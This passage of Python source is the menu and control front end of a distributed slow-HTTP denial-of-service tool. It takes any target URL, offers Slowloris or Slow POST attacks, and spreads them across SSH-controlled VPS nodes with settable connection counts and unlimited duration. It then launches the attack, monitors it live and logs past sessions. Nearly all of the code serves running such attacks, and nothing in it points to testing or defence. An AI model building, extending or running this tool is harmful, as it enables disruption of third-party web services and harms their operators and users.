                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        self.clear_screen()
        self.print_banner()
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.RESET}")
        print("=" * 40)
        
        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            # Target configuration
            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
            target_url = self.input_with_prompt("Target URL (e.g., http://target.com): ")
            if not target_url:
                return
            
            # Parse and validate target
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            # Attack type selection
            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (Slow Headers)")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST (R.U.D.Y)")
            
            attack_choice = self.input_with_prompt("Select attack type (1-2): ")
            attack_types = {'1': 'slowloris', '2': 'slow_post'}
            attack_type = attack_types.get(attack_choice)
            
            if not attack_type:
                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # VPS selection
            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
            vps_choice = self.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
            
            if vps_choice.lower() == 'y':
                selected_vps = [vps[1] for vps in online_vps]
            else:
                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
                selection = self.input_with_prompt("VPS selection: ")
                if not selection:
                    return
                
                try:
                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
                    selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
                except (ValueError, IndexError):
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
            
            connections_str = self.input_with_prompt("Connections per VPS (default 100): ", False) or "100"
            try:
                connections = int(connections_str)
                if connections > 5000:
                    print(f"{Colors.YELLOW}[WARNING] High connection count may overload VPS{Colors.RESET}")
            except ValueError:
                connections = 100
            
            delay_str = self.input_with_prompt("Delay between packets in seconds (default 15): ", False) or "15"
            try:
                delay = int(delay_str)
            except ValueError:
                delay = 15
            
            duration_str = self.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False) or "0"
            try:
                duration = int(duration_str)
            except ValueError:
                duration = 0
            
            # Attack summary
            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
            print(f"Attack Type: {Colors.YELLOW}{attack_type.replace('_', ' ').title()}{Colors.RESET}")
            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
            print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
            print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
            print(f"Packet Delay: {Colors.YELLOW}{delay}s{Colors.RESET}")
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
            
            # Final confirmation
            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Create attack session
            session_name = f"Attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0]
            
            parameters = {
                'connections': connections,
                'delay': delay,
                'duration': duration
            }
            
            session_id = self.db_manager.create_attack_session(
                session_name, target_url, target_host, attack_type, selected_vps, parameters
            )
            
            # Launch attack
            success = self.attack_manager.launch_attack(
                session_id, target_url, attack_type, selected_vps, parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] Attack launched successfully!{Colors.RESET}")
                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                
                # Auto-start monitoring
                input(f"\n{Colors.YELLOW}Press Enter to start monitoring...{Colors.RESET}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        if session_id is None:
            # List active attacks
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
                print(f"Session {sid}: {attack_info['target_host']} ({attack_info['attack_type']})")
            
            try:
                session_input = self.input_with_prompt("Enter session ID to monitor: ")
                if not session_input or not session_input.isdigit():
                    return
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time monitoring...{Colors.RESET}")
        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(2)
        
        try:
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                # Clear screen and display status
                self.clear_screen()
                
                print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
                print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
                
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_info.get('attack_type', 'Unknown').upper()}{Colors.RESET}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Last Check'}")
                print("-" * 60)
                
                total_processes = 0
                active_vps = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    
                    total_processes += processes
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {datetime.now().strftime('%H:%M:%S')}")
                
                print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.RESET}")
                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
                
                est_connections = total_processes * attack_info.get('parameters', {}).get('connections', 100)
                print(f"{Colors.YELLOW}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
                
                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
            
            # Ask if user wants to stop the attack
            try:
                stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.RESET}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        self.clear_screen()
        self.print_banner()
        
        sessions = self.db_manager.get_attack_sessions()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
        else:
            print(f"\n{'ID':<4} {'Session Name':<20} {'Target':<25} {'Type':<12} {'Status':<10} {'Start Time'}")
            print("-" * 100)
            
            for session in sessions:
                start_time = session[6][:19] if session[6] else 'N/A'
                status_color = Colors.GREEN if session[8] == 'completed' else Colors.YELLOW if session[8] == 'running' else Colors.RED
                
                print(f"{session[0]:<4} {session[1][:19]:<20} {session[3][:24]:<25} {session[4]:<12} {status_color}{session[8]:<10}{Colors.RESET} {start_time}")
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 20)
        
        # VPS Statistics
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps[5] == 'online')
        offline_count = len(vps_list) - online_count
        
        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
        
        # Attack Statistics
        sessions = self.db_manager.get_attack_sessions()
        active_attacks = len(self.attack_manager.active_attacks)
        
        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
        print(f"Active Attacks: {Colors.GREEN}{active_attacks}{Colors.RESET}")
        
        # SSH Connections
        ssh_connections = len(self.ssh_manager.connections)
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
        
        # System Information
        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.system_status_menu()
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")

def main():
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Check dependencies
    try:
        import paramiko
        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Please install: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    os.makedirs('config', exist_ok=True)
    
    # Initialize and run TUI
    try:
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
